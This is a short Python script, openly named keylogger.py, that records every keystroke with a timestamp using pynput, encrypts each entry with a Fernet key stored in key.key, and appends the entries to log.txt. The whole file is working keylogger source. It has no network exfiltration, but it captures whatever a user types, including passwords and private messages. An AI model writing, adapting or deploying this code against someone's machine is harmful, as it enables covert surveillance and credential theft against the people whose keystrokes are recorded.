# keylogger.py
from pynput import keyboard
from cryptography.fernet import Fernet
import datetime
import os

# Generate or read existing key
if not os.path.exists("key.key"):
    key = Fernet.generate_key()
    with open("key.key", "wb") as f:
        f.write(key)
else:
    with open("key.key", "rb") as f:
        key = f.read()

cipher = Fernet(key)
log_file = "log.txt"

def on_press(key_input):
    try:
        log = f'{datetime.datetime.now()} - {key_input.char}\n'
    except AttributeError:
        log = f'{datetime.datetime.now()} - {key_input}\n'

    encrypted = cipher.encrypt(log.encode())
    with open(log_file, 'ab') as f:
        f.write(encrypted + b'\n')

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
